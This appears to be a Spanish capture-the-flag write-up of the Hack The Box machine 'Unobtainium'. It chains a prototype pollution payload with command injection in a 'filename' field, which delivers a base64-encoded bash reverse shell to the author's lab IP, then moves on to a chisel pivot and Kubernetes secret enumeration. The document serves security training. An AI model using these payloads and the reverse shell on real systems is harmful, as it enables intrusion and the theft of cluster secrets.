---
layout: post
title: Unobtainium
date: 2023-02-21
description:
img:
fig-caption:
tags: [eCPPTv2, eCPTXv2, eWPT, eWPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Unobtainium-htb/Unobtainium.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inspección de aplicación DEB

* Uso de Wireshark para analizar paquetes

* Análisis de código Javascript

* Information Disclosure

* LFI

* RCE en módulo Google CloudStorage Commands

* Prototype Pollution

* Enumeración de Kubernetes

* Pivoting

* Creación de un POD malicioso (Escalada de Privilegios)

***

# Video

<iframe width="420" height="315" src="https://www.youtube.com/embed/oMiIaRCJVlk" frameborder="0" allowfullscreen></iframe>

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.235 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 17:48 GMT
Nmap scan report for 10.10.10.235
Host is up (0.14s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8443/tcp  open  https-alt
10250/tcp open  unknown
10251/tcp open  unknown
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,8443,10250,10251,31337 10.10.10.235 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 17:49 GMT
Nmap scan report for 10.10.10.235
Host is up (0.23s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http          Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Unobtainium
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 73dac827-648f-4a8d-ab1c-040dc36ca413
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 21 Feb 2023 17:49:52 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: b88dc885-14d9-42ed-bb10-06ada65412ba
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 21 Feb 2023 17:49:50 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Audit-Id: 8ad37eec-c588-4f65-8a67-8b026dd05136
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Tue, 21 Feb 2023 17:49:52 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=k3s/organizationName=k3s
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:unobtainium, IP Address:10.10.10.235, IP Address:10.129.136.226, IP Address:10.43.0.1, IP Address:127.0.0.1
| Not valid before: 2022-08-29T09:26:11
|_Not valid after:  2024-02-21T17:42:40
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (application/json).
10250/tcp open  ssl/http      Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=unobtainium
| Subject Alternative Name: DNS:unobtainium, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.10.235
| Not valid before: 2022-08-29T09:26:11
|_Not valid after:  2024-02-21T17:42:24
10251/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Cache-Control: no-cache, private
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 21 Feb 2023 17:50:15 GMT
|     Content-Length: 19
|     page not found
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Cache-Control: no-cache, private
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 21 Feb 2023 17:49:43 GMT
|     Content-Length: 19
|     page not found
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Cache-Control: no-cache, private
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Tue, 21 Feb 2023 17:49:44 GMT
|     Content-Length: 19
|_    page not found
31337/tcp open  http          Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods: 
|_  Potentially risky methods: PUT DELETE
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=2/21%Time=63F5043D%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,14A,"HTTP/1\.0\x20401\x20Unauthorized\r\nAudit-Id:\x20b8
SF:8dc885-14d9-42ed-bb10-06ada65412ba\r\nCache-Control:\x20no-cache,\x20pr
SF:ivate\r\nContent-Type:\x20application/json\r\nDate:\x20Tue,\x2021\x20Fe
SF:b\x202023\x2017:49:50\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"kind\"
SF::\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\
SF:",\"message\":\"Unauthorized\",\"reason\":\"Unauthorized\",\"code\":401
SF:}\n")%r(HTTPOptions,14A,"HTTP/1\.0\x20401\x20Unauthorized\r\nAudit-Id:\
SF:x208ad37eec-c588-4f65-8a67-8b026dd05136\r\nCache-Control:\x20no-cache,\
SF:x20private\r\nContent-Type:\x20application/json\r\nDate:\x20Tue,\x2021\
SF:x20Feb\x202023\x2017:49:52\x20GMT\r\nContent-Length:\x20129\r\n\r\n{\"k
SF:ind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Fai
SF:lure\",\"message\":\"Unauthorized\",\"reason\":\"Unauthorized\",\"code\
SF:":401}\n")%r(FourOhFourRequest,14A,"HTTP/1\.0\x20401\x20Unauthorized\r\
SF:nAudit-Id:\x2073dac827-648f-4a8d-ab1c-040dc36ca413\r\nCache-Control:\x2
SF:0no-cache,\x20private\r\nContent-Type:\x20application/json\r\nDate:\x20
SF:Tue,\x2021\x20Feb\x202023\x2017:49:52\x20GMT\r\nContent-Length:\x20129\
SF:r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"sta
SF:tus\":\"Failure\",\"message\":\"Unauthorized\",\"reason\":\"Unauthorize
SF:d\",\"code\":401}\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10251-TCP:V=7.93%I=7%D=2/21%Time=63F50435%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,D2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCache
SF:-Control:\x20no-cache,\x20private\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Tue,\x202
SF:1\x20Feb\x202023\x2017:49:43\x20GMT\r\nContent-Length:\x2019\r\n\r\n404
SF:\x20page\x20not\x20found\n")%r(HTTPOptions,D2,"HTTP/1\.0\x20404\x20Not\
SF:x20Found\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x20nosniff\r\nD
SF:ate:\x20Tue,\x2021\x20Feb\x202023\x2017:49:44\x20GMT\r\nContent-Length:
SF:\x2019\r\n\r\n404\x20page\x20not\x20found\n")%r(RTSPRequest,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(F
SF:ourOhFourRequest,D2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCache-Control:
SF:\x20no-cache,\x20private\r\nContent-Type:\x20text/plain;\x20charset=utf
SF:-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Tue,\x2021\x20Feb\
SF:x202023\x2017:50:15\x20GMT\r\nContent-Length:\x2019\r\n\r\n404\x20page\
SF:x20not\x20found\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.40 seconds
```

## Puerto 80 (HTTP) | Puerto 8443 (HTTPS)

Con whatweb analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.10.235
http://10.10.10.235 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.235], JQuery, Script, Title[Unobtainium]
```

```null
whatweb https://10.10.10.235:8443
https://10.10.10.235:8443 [401 Unauthorized] Country[RESERVED][ZZ], IP[10.10.10.235], UncommonHeaders[audit-id]
```

Las páginas principales se ven así:

<img src="/writeups/assets/img/Unobtainium-htb/1.png" alt="">

Puedo descargar un comprimido desde el puerto 80

<img src="/writeups/assets/img/Unobtainium-htb/2.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.235/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.235/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/02/21 18:04:13 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.10.235/images/]
/downloads            (Status: 301) [Size: 316] [--> http://10.10.10.235/downloads/]
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.235/assets/]   
/server-status        (Status: 403) [Size: 277]                                     
                                                                                    
===============================================================
2023/02/21 18:08:45 Finished
===============================================================
```

Descomprimo el archivo para ver su contenido

```null
unzip unobtainium_debian.zip -d packages
```

Dentro hay un paquete DEB

```null
ls
unobtainium_1.0.0_amd64.deb  unobtainium_1.0.0_amd64.deb.md5sum
```

No lo voy a instalar, pero si a descomprimirlo

```null
dpkg-deb -xv unobtainium_1.0.0_amd64.deb analisis
```

Puedo ver la estructura del proyecto

```null
tree -L 3
.
├── opt
│   └── unobtainium
│       ├── chrome_100_percent.pak
│       ├── chrome_200_percent.pak
│       ├── chrome-sandbox
│       ├── icudtl.dat
│       ├── libEGL.so
│       ├── libffmpeg.so
│       ├── libGLESv2.so
│       ├── libvk_swiftshader.so
│       ├── libvulkan.so
│       ├── LICENSE.electron.txt
│       ├── LICENSES.chromium.html
│       ├── locales
│       ├── resources
│       ├── resources.pak
│       ├── snapshot_blob.bin
│       ├── swiftshader
│       ├── unobtainium
│       ├── v8_context_snapshot.bin
│       └── vk_swiftshader_icd.json
└── usr
    └── share
        ├── applications
        ├── doc
        └── icons

11 directories, 16 files
```

Se está utilizando ```electron``` por detrás. Ejecuto el binario ```unobtainium``` 

```null
./unobtainium --no-sandbox
```

<img src="/writeups/assets/img/Unobtainium-htb/3.png" alt="">

Se está aplicando Virtual Hosting. Añado el dominio ```unobtainium.htb``` al ```/etc/hosts```

Al clickar en TODO me aparece una respuesta en JSON

<img src="/writeups/assets/img/Unobtainium-htb/4.png" alt="">

Abro el Wireshark para analizar que se tramita. Viajan credenciales en texto claro

<img src="/writeups/assets/img/Unobtainium-htb/5.png" alt="">

Hago lo mismo al envíar el mensaje

<img src="/writeups/assets/img/Unobtainium-htb/6.png" alt="">

Se tramita una petición por PUT al puerto 31337

<img src="/writeups/assets/img/Unobtainium-htb/7.png" alt="">

Replico ambas peticiones en oneliners de ```curl```

```null
curl -s -X PUT -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"text":"test"}}' http://10.10.10.235:31337 | jq
{
  "ok": true
}
```

```null
curl -s -X POST -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt"}' http://10.10.10.235:31337/todo | jq
{
  "ok": true,
  "content": "1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n"
}
```

Como se está referenciando a un archivo en el campo ```filename```, puedo probar un LFI para intentar acceder a otro archivo local de la máquina. Pero no carga nada, así que es probable que esté sanitizado

```null
curl -s -X POST -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"../../../../../../../etc/passwd"}' http://10.10.10.235:31337/todo | jq
```

Como se está autenticando contra el puerto 31337 que corresponde a ```Node.js```, tiene más sentido abrir el ```index.js```. Lo almaceno para inspeccionarlo al detalle

```null
cat portscan | grep 31337 | tail -n 1
31337/tcp open  http          Node.js Express framework
```

```null
curl -s -X POST -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"index.js"}' http://10.10.10.235:31337/todo | jq -r '.["content"]' > index.js
```

Están definidos dos usuarios

```null
const users = [
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
];
```

La contraseña del usuario Administrador es aleatoria, por lo que no puedo obtener su valor en texto claro. En caso de convertirme en él, puedo subir archivos a la máquina

```null
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }
```

Lo compruebo tramitando la petición

```null
curl -s -X POST -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"index.js"}' http://10.10.10.235:31337/upload | jq
{
  "ok": false,
  "error": "Access denied"
}
```

Se está importando el módulo ```google-cloudstorage-commands```

```null
var root = require("google-cloudstorage-commands");
```

Para algunas versiones es posible inyectar comandos

<img src="/writeups/assets/img/Unobtainium-htb/8.png" alt="">

Este campo existe en el código particular

```null
filename = req.body.filename;
root.upload("./",filename, true);
res.send({ok: true, Uploaded_File: filename});
```

Está tomando el campo ```filename``` como argumento. Pero de momento no puedo abusar de esto ya que no tengo el privilegio de enviar datos a ```/upload```. Para solucionarlo, podría intentar cambiar los atributos de mi usuario. Una función es vulnerable a ```Prototype Pollution```. En este [artículo](https://security.snyk.io/vuln/SNYK-JS-MERGE-1042987) esta todo detallado

```null
_.merge(message, req.body.message, {
  id: lastId++,
  timestamp: Date.now(),
  userName: user.name,
});
```

<img src="/writeups/assets/img/Unobtainium-htb/9.png" alt="">

La prueba de concepto es bastante sencilla. Mediante la propiedad ```__proto__``` es posible cambiar los valores de atributos asignándoselos a otra variable

<img src="/writeups/assets/img/Unobtainium-htb/10.png" alt="">

En mi caso, tengo que editar el atributo ```canUpload``` para setearlo a True y de esa manera poder comunicarme con ```/upload``` para abusar de la vulnerabilidad del módulo de ```google-cloudstorage-commands``` y poder ejecutar comandos. Como se está tomando como argumento ```message```, lo mas probable es que corresponda a la petición por PUT que vi antes

```null
curl -s -X PUT -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"__proto__":{"canUpload": "true"}}}' http://10.10.10.235:31337 | jq
{
  "ok": true
}
```

Ahora ya me puedo enviar la reverse shell

```null
echo "bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'" | base64 -w 0 | xclip -sel clip
```

```null
curl -s -X POST -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt & echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0MyAwPiYxJwo= | base64 -d |bash"}' http://10.10.10.235:31337/upload | jq
{
  "ok": true,
  "Uploaded_File": "todo.txt & echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0MyAwPiYxJwo= | base64 -d |bash"
}
```

Y la recibo en una sesión de netcat

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.235] 37969
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@webapp-deployment-9546bc7cb-6r7sq:/usr/src/app# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@webapp-deployment-9546bc7cb-6r7sq:/usr/src/app# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@webapp-deployment-9546bc7cb-6r7sq:/usr/src/app# export TERM=xterm
root@webapp-deployment-9546bc7cb-6r7sq:/usr/src/app# export SHELL=bash
root@webapp-deployment-9546bc7cb-6r7sq:/usr/src/app# stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
root@webapp-deployment-9546bc7cb-6r7sq:/usr/src/app# hostname -I
10.42.0.42 
```

Puedo ver la primera flag

```null
root@webapp-deployment-9546bc7cb-6r7sq:~# cat user.txt 
09e168224deae0cead46229260b7089b
```

# Escalada

Hay una tarea CRON que se encarga de buscar cada minuto por el nombre ```kubectl```para eliminarlo

```null
root@webapp-deployment-9546bc7cb-6r7sq:~# crontab -l
* * * * * find / -name kubectl -exec rm {} \;
```

Lo descargo para subirlo al contenedor

```null
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

Para que no lo elimine, le cambio el nombre por otro cualquiera

```null
mv kubectl kbctl
```

Esta herramienta trae un comando que permite saber si tengo los permisos necesarios para realizar una acción. No puedo listar los PODs

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl auth can-i get pods
no
```

Pero sí los namespaces

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl auth can-i get namespaces
Warning: resource 'namespaces' is not namespace scoped

yes
```

En caso de que pueda crear un POD, es posible asignarle un archivo YAML que se encarge de escapar del contenedor, creando uno nuevo que en su despliegue permita ejecutar comandos en la máquina host. Pero tampoco tengo acceso

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl auth can-i create pod
no
```

Obtengo todos los namespaces para ver los PODs que tienen asignados

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl get namespaces
NAME              STATUS   AGE
default           Active   176d
kube-system       Active   176d
kube-public       Active   176d
kube-node-lease   Active   176d
dev               Active   176d
```

Solo tengo acceso en ```dev```

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl get pods -n default
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "default"
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl get pods -n kube-system
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "kube-system"
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl get pods -n kube-public
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "kube-public"
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl get pods -n kube-node-lease
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list resource "pods" in API group "" in the namespace "kube-node-lease"
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl get pods -n dev
NAME                                  READY   STATUS    RESTARTS       AGE
devnode-deployment-776dbcf7d6-sr6vj   1/1     Running   4 (176d ago)   176d
devnode-deployment-776dbcf7d6-g4659   1/1     Running   4 (176d ago)   176d
devnode-deployment-776dbcf7d6-7gjgf   1/1     Running   4 (176d ago)   176d
```

Listo las propiedades del primer POD

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl describe pods/devnode-deployment-776dbcf7d6-sr6vj -n dev
```

Puedo ver una IP que no conocía de antes

```null
...
Status:           Running
IP:               10.42.0.46
IPs:
  IP:           10.42.0.46
...
```

Está en escucha por el puerto 3000

```null
...
Containers:
  devnode:
    Container ID:   docker://7d6e3098de583fddfb533f85ad0e09d7bc68bb3e4b65f7e023185b6756fe669e
    Image:          localhost:5000/node_server
    Image ID:       docker-pullable://localhost:5000/node_server@sha256:e965afd6a7e1ef3093afdfa61a50d8337f73cd65800bdeb4501ddfbc598016f5
    Port:           3000/TCP
    Host Port:      0/TCP
...
```

Tramito una petición por GET a esa IP, por ese puerto

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# curl -s -X GET http://10.42.0.46:3000; echo
[]
```

La estética es bastante similar a la sección de mensajes de la aplicación ```unobtainium```

<img src="/writeups/assets/img/Unobtainium-htb/10.png" alt="">

Tramito peticiones por POST a las dos rutas que conozco

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# curl -s -X POST http://10.42.0.46:3000/todo; echo
{"ok":false,"error":"Access denied"}
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# curl -s -X POST http://10.42.0.46:3000/upload; echo
{"ok":false,"error":"Access denied"}
```

Intento extraer los secretos de todos los namespaces

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl auth can-i get secrets -n default
no
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl auth can-i get secrets -n kube-system
no
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl auth can-i get secrets -n kube-public
no
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl auth can-i get secrets -n kube-node-lease
no
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./kbctl auth can-i get secrets -n dev
no
```

Puedo volver a efectuar el ```Prototype Pollution``` para ganar acceso a otro contenedor. Para tener conectividad desde mi equipo, subo el ```chisel``` para montarme un tunel por SOCKS5

En mi equipo local lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

En el contenedor me conecto como cliente

```null
root@webapp-deployment-9546bc7cb-6r7sq:/tmp# ./chisel client 10.10.16.6:1234 R:socks &>/dev/null & disown
```

A través de proxychains, me asigno los privilegios para poder enviarme la reverse shell

```null
proxychains curl -s -X PUT -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"message":{"__proto__":{"canUpload": "true"}}}' http://10.42.0.46:3000 | jq
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
{
  "ok": true
}
```

```null
proxychains curl -s -X POST -H "Content-Type: application/json" -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"todo.txt & echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0MyAwPiYxJwo= | base64 -d |bash"}' http://10.42.0.46:3000/upload | jq
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
{
  "ok": true,
  "Uploaded_File": "todo.txt & echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0MyAwPiYxJwo= | base64 -d |bash"
}
```

Gano acceso en una sesión de netcat

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.235] 63757
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@devnode-deployment-776dbcf7d6-sr6vj:/usr/src/app# script /dev/null -c bash
<bcf7d6-sr6vj:/usr/src/app# script /dev/null -c bash   
Script started, file is /dev/null
root@devnode-deployment-776dbcf7d6-sr6vj:/usr/src/app# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@devnode-deployment-776dbcf7d6-sr6vj:/usr/src/app# export TERM=xterm
root@devnode-deployment-776dbcf7d6-sr6vj:/usr/src/app# export SHELL=bash
root@devnode-deployment-776dbcf7d6-sr6vj:/usr/src/app# stty rows 55 columns 209
```

Al estar en otra máquina, tengo que volver a subir el kubctl y el chisel. En este tampoco puedo crear PODs ni obtener los namespaces, pero ya los tenía listados del otro contenedor, por lo que no es del todo necesario tener este privilegio

```null
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i create pods
no
```

```null
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i get namespaces
Warning: resource 'namespaces' is not namespace scoped

no
```

Es posible que ahora si sea capaz de obtener los secretos

```null
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i get secrets -n default
no
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i get secrets -n kube-system
yes
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i get secrets -n kube-public
no
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i get secrets -n kube-node-lease
no
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl auth can-i get secrets -n dev  
no
```

Se da el caso para el segundo

```null
root@devnode-deployment-776dbcf7d6-sr6vj:/tmp# ./kbctl get secrets -n kube-system
NAME                                                 TYPE                                  DATA   AGE
unobtainium.node-password.k3s                        Opaque                                1      176d
horizontal-pod-autoscaler-token-2fg27                kubernetes.io/service-account-token   3      176d
coredns-token-jx62b                                  kubernetes.io/service-account-token   3      176d
local-path-provisioner-service-account-token-2tk2q   kubernetes.io/service-account-token   3      176d
statefulset-controller-token-b25sg                   kubernetes.io/service-account-token   3      176d
certificate-controller-token-98jdq                   kubernetes.io/service-account-token   3      176d
root-ca-cert-publisher-token-t564t                   kubernetes.io/service-account-token   3      176d
ephemeral-volume-controller-token-brb5h              kubernetes.io/service-account-token   3      176d
ttl-after-finished-controller-token-wf8k9            kubernetes.io/service-account-token   3      176d
